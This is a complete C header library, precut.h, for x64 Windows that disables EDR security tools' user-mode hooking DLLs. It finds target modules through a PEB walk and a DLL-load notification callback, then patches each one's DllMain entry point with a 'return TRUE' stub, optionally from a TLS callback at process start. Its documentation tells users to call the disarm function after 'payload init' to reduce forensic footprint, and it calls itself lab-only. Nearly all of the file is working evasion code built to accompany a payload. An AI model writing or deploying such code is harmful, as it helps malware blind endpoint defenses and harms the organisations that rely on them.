/*
 * ========================================================================
 *  precut.h — single-header EDR hook prevention via TLS callback timing
 * ========================================================================
 *
 * Drop-in library that prevents EDR user-mode hooking DLLs from
 * initializing by stubbing their entry points before DllMain runs.
 *
 * QUICK START
 * -----------
 *   // In exactly ONE .c file:
 *   #define PRECUT_IMPLEMENTATION
 *
 *   // Define your targets (replace placeholders with real module names):
 *   //   PREFIX → versioned DLLs (suffix changes per agent update)
 *   //   EXACT  → fixed-name DLLs (same filename across versions)
 *   #define PRECUT_TARGETS             \
 *       PRECUT_PREFIX(L"edr_hook")     \
 *       PRECUT_PREFIX(L"edr_dev")      \
 *       PRECUT_EXACT(L"edrclient64.dll")
 *
 *   // Optional: auto-register a TLS callback (standalone use):
 *   #define PRECUT_TLS_AUTO
 *
 *   #include "precut.h"
 *
 * API
 * ---
 *   void precut_arm(void)
 *       Walk PEB for already-mapped targets (Write A), then register
 *       LdrRegisterDllNotification to catch future maps (Write B).
 *       Call this from a TLS callback or any point before NtTestAlert.
 *
 *   void precut_disarm(void)
 *       Unregister the DLL load notification. Call after payload init
 *       to reduce forensic footprint.
 *
 *   void precut_set_callback(precut_stub_fn fn)
 *       Register a function called after each successful stub write.
 *       Signature: void fn(const wchar_t *name, void *base, int ok)
 *       Set to NULL to disable (default).
 *
 *   int precut_stub_count(void)
 *       Returns the number of entry points successfully stubbed so far.
 *
 * TARGET MACROS
 * -------------
 *   PRECUT_PREFIX(L"prefix")   Use for versioned DLLs whose basename
 *                              includes a build number or hash that
 *                              changes across agent updates. Give only
 *                              the stable leading part. Case-insensitive
 *                              prefix match with .dll suffix guard.
 *                              "hookeng8542.dll" matches PREFIX(L"hookeng").
 *
 *   PRECUT_EXACT(L"name.dll")  Use for fixed-name DLLs that never change
 *                              across versions. Case-insensitive exact
 *                              basename match — zero ambiguity.
 *
 *   PREFIX works for both cases if the prefix is specific enough to never
 *   collide with unrelated modules. EXACT rules out accidental matches on
 *   generic prefixes. Stubbing the wrong module crashes the process.
 *
 * COMPILE-TIME OPTIONS
 * --------------------
 *   PRECUT_IMPLEMENTATION      Include the implementation (one .c only).
 *   PRECUT_TLS_AUTO            Emit MSVC TLS plumbing so precut_arm()
 *                              runs automatically at process attach.
 *   PRECUT_STATIC              Make all API functions static (default
 *                              when PRECUT_TLS_AUTO is set).
 *
 * REQUIREMENTS
 * ------------
 *   MSVC (VS2022 v143), x64, /MT recommended. See README for why
 *   GCC/MinGW cannot produce the required TLS directory.
 *
 * Lab use only. Not production.
 */

#ifndef PRECUT_H
#define PRECUT_H

#include <windows.h>

#ifndef _WIN64
#error precut.h: x64 only.
#endif

#ifdef __cplusplus
extern "C" {
#endif

/* ---- Public types ---------------------------------------------------- */

/* Callback invoked after each stub attempt.
 *   name  — basename of the target DLL
 *   base  — load address of the image
 *   ok    — 1 if the entry point was successfully stubbed, 0 on failure */
typedef void (*precut_stub_fn)(const wchar_t *name, void *base, int ok);

/* ---- Linkage control ------------------------------------------------- */

#if defined(PRECUT_STATIC) || defined(PRECUT_TLS_AUTO)
#define PRECUT_API static
#else
#define PRECUT_API
#endif

/* ---- Public API declarations ----------------------------------------- */

PRECUT_API void precut_arm(void);
PRECUT_API void precut_disarm(void);
PRECUT_API void precut_set_callback(precut_stub_fn fn);
PRECUT_API int  precut_stub_count(void);

#ifdef __cplusplus
}
#endif

/* ======================================================================
 *  IMPLEMENTATION
 * ====================================================================== */

#ifdef PRECUT_IMPLEMENTATION

#include <winternl.h>

/* ---- Default target list (placeholders — match nothing on a live system)
 *
 * Replace with real DLL names from your lab:
 *   PRECUT_PREFIX  → versioned DLLs (build number/hash changes per update)
 *   PRECUT_EXACT   → fixed-name DLLs (same filename across all versions)
 *
 * Add or remove entries to match what your target EDR injects.
 * --------------------------------------------------------------------- */

#ifndef PRECUT_TARGETS
#define PRECUT_TARGETS                         \
    PRECUT_PREFIX(L"edr_hook")                 \
    PRECUT_PREFIX(L"edr_dev")                  \
    PRECUT_EXACT(L"edrclient64.dll")           \
    PRECUT_EXACT(L"edrclient.dll")
#endif

/* ---- Undocumented loader structures ---------------------------------- */

typedef struct _PRECUT_DLL_NOTIFICATION_DATA {
    ULONG           Flags;
    PUNICODE_STRING FullDllName;
    PUNICODE_STRING BaseDllName;
    PVOID           DllBase;
    ULONG           SizeOfImage;
} PRECUT_DLL_NOTIFICATION_DATA;

typedef union _PRECUT_DLL_NOTIFICATION {
    PRECUT_DLL_NOTIFICATION_DATA Loaded;
} PRECUT_DLL_NOTIFICATION, *PPRECUT_DLL_NOTIFICATION;

#define PRECUT_REASON_LOADED 1

typedef VOID (CALLBACK *PRECUT_NOTIFICATION_FN)(
    ULONG, PPRECUT_DLL_NOTIFICATION, PVOID);

typedef NTSTATUS (NTAPI *fnLdrRegisterDllNotification)(
    ULONG, PRECUT_NOTIFICATION_FN, PVOID, PVOID *);

typedef NTSTATUS (NTAPI *fnLdrUnregisterDllNotification)(PVOID);

/* Partial LDR_DATA_TABLE_ENTRY for PEB module walk */
typedef struct _PRECUT_LDR {
    LIST_ENTRY     InLoadOrderLinks;
    LIST_ENTRY     InMemoryOrderLinks;
    LIST_ENTRY     InInitializationOrderLinks;
    PVOID          DllBase;
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} PRECUT_LDR;

/* ---- State ----------------------------------------------------------- */

static PVOID           g_precut_cookie   = NULL;
static precut_stub_fn  g_precut_callback = NULL;
static volatile LONG   g_precut_stubs    = 0;

/* ---- Name matching --------------------------------------------------- */

static wchar_t precut__fold(wchar_t c)
{
    return (c >= L'A' && c <= L'Z') ? (wchar_t)(c + 32) : c;
}

static int precut__copy_uname(const UNICODE_STRING *u, wchar_t *out, int cap)
{
    int n, i;
    if (!u || !u->Buffer || u->Length == 0 || cap < 2) return 0;
    n = (int)(u->Length / sizeof(wchar_t));
    if (n >= cap) n = cap - 1;
    for (i = 0; i < n; i++) out[i] = u->Buffer[i];
    out[n] = 0;
    return n;
}

static int precut__prefix_dll(const wchar_t *name, const wchar_t *prefix)
{
    int i = 0, n = 0;
    if (!name || !prefix) return 0;
    while (prefix[i]) {
        if (precut__fold(name[i]) != precut__fold(prefix[i])) return 0;
        i++;
    }
    if (!name[i]) return 0;
    while (name[n]) n++;
    if (n < 4) return 0;
    return precut__fold(name[n-4]) == L'.'
        && precut__fold(name[n-3]) == L'd'
        && precut__fold(name[n-2]) == L'l'
        && precut__fold(name[n-1]) == L'l';
}

static int precut__wicmp(const wchar_t *a, const wchar_t *b)
{
    while (*a && *b) {
        wchar_t la = precut__fold(*a), lb = precut__fold(*b);
        if (la != lb) return (int)(la - lb);
        a++; b++;
    }
    return (int)(precut__fold(*a) - precut__fold(*b));
}

/* X-macro expansion: PRECUT_TARGETS is expanded with PRECUT_PREFIX and
 * PRECUT_EXACT temporarily defined as match operations. */
static int precut__is_target(const wchar_t *basename)
{
#define PRECUT_PREFIX(p) if (precut__prefix_dll(basename, p)) return 1;
#define PRECUT_EXACT(n)  if (precut__wicmp(basename, n) == 0) return 1;
    PRECUT_TARGETS
#undef PRECUT_PREFIX
#undef PRECUT_EXACT
    return 0;
}

/* ---- Entry-point stubbing -------------------------------------------- */

/* B8 01 00 00 00 C3 = mov eax, 1 / ret (DllMain returns TRUE) */
static const BYTE precut__stub[6] = { 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3 };

static int precut__stub_entry(PVOID dll_base)
{
    BYTE *base = (BYTE *)dll_base;
    IMAGE_DOS_HEADER *dos;
    IMAGE_NT_HEADERS *nt;
    DWORD ep_rva, old;
    BYTE *ep;

    if (!base) return 0;
    dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    ep_rva = nt->OptionalHeader.AddressOfEntryPoint;
    if (!ep_rva || (SIZE_T)ep_rva + 6 > nt->OptionalHeader.SizeOfImage)
        return 0;
    ep = base + ep_rva;

    if (ep[0] == 0xB8 && ep[1] == 0x01 && ep[2] == 0x00 &&
        ep[3] == 0x00 && ep[4] == 0x00 && ep[5] == 0xC3)
        return 1;  /* already stubbed — count as success */

    if (!VirtualProtect(ep, sizeof(precut__stub), PAGE_EXECUTE_READWRITE, &old))
        return 0;
    CopyMemory(ep, precut__stub, sizeof(precut__stub));
    VirtualProtect(ep, sizeof(precut__stub), old, &old);
    return 1;
}

/* Stub + callback + counter wrapper */
static void precut__do_stub(const wchar_t *name, PVOID base)
{
    int ok = precut__stub_entry(base);
    if (ok) InterlockedIncrement(&g_precut_stubs);
    if (g_precut_callback) g_precut_callback(name, base, ok);
}

/* ---- Write A: PEB walk for already-mapped targets -------------------- */

static void precut__peb_stub(void)
{
    PPEB peb = (PPEB)__readgsqword(0x60);
    LIST_ENTRY *head, *cur;
    if (!peb || !peb->Ldr) return;
    head = &peb->Ldr->InMemoryOrderModuleList;
    for (cur = head->Flink; cur != head; cur = cur->Flink) {
        PRECUT_LDR *mod = CONTAINING_RECORD(cur, PRECUT_LDR, InMemoryOrderLinks);
        wchar_t name[256];
        if (!precut__copy_uname(&mod->BaseDllName, name, 256)) continue;
        if (precut__is_target(name) && mod->DllBase)
            precut__do_stub(name, mod->DllBase);
    }
}

/* ---- Write B: DLL load notification callback ------------------------- */

static VOID CALLBACK precut__on_loaded(
    ULONG reason, PPRECUT_DLL_NOTIFICATION data, PVOID ctx)
{
    wchar_t name[256];
    (void)ctx;
    if (reason != PRECUT_REASON_LOADED) return;
    if (!data || !data->Loaded.BaseDllName) return;
    if (!precut__copy_uname(data->Loaded.BaseDllName, name, 256)) return;
    if (!precut__is_target(name)) return;
    precut__do_stub(name, data->Loaded.DllBase);
}

/* ---- Public API implementation --------------------------------------- */

PRECUT_API void precut_arm(void)
{
    HMODULE ntdll;
    fnLdrRegisterDllNotification reg;

    /* Write A: stub anything already in the loader list */
    precut__peb_stub();

    /* Write B: register for future maps */
    ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return;
    reg = (fnLdrRegisterDllNotification)GetProcAddress(
        ntdll, "LdrRegisterDllNotification");
    if (!reg) return;
    reg(0, precut__on_loaded, NULL, &g_precut_cookie);
}

PRECUT_API void precut_disarm(void)
{
    fnLdrUnregisterDllNotification unreg;
    HMODULE ntdll;

    if (!g_precut_cookie) return;
    ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return;
    unreg = (fnLdrUnregisterDllNotification)GetProcAddress(
        ntdll, "LdrUnregisterDllNotification");
    if (!unreg) return;
    unreg(g_precut_cookie);
    g_precut_cookie = NULL;
}

PRECUT_API void precut_set_callback(precut_stub_fn fn)
{
    g_precut_callback = fn;
}

PRECUT_API int precut_stub_count(void)
{
    return (int)g_precut_stubs;
}

/* ---- Optional TLS auto-registration --------------------------------- */

#ifdef PRECUT_TLS_AUTO
#ifdef _MSC_VER

static void NTAPI precut__tls_callback(PVOID h, DWORD reason, PVOID r)
{
    (void)h; (void)r;
    if (reason != DLL_PROCESS_ATTACH) return;
    precut_arm();
}

#pragma comment(linker, "/INCLUDE:_tls_used")
#pragma section(".CRT$XLB", long, read)
__declspec(allocate(".CRT$XLB"))
    PIMAGE_TLS_CALLBACK g_precut_tls_cb = precut__tls_callback;
__declspec(thread) static volatile int g_precut_tls_sentinel = 0;

#else
#error PRECUT_TLS_AUTO requires MSVC.
#endif
#endif /* PRECUT_TLS_AUTO */

#endif /* PRECUT_IMPLEMENTATION */
#endif /* PRECUT_H */
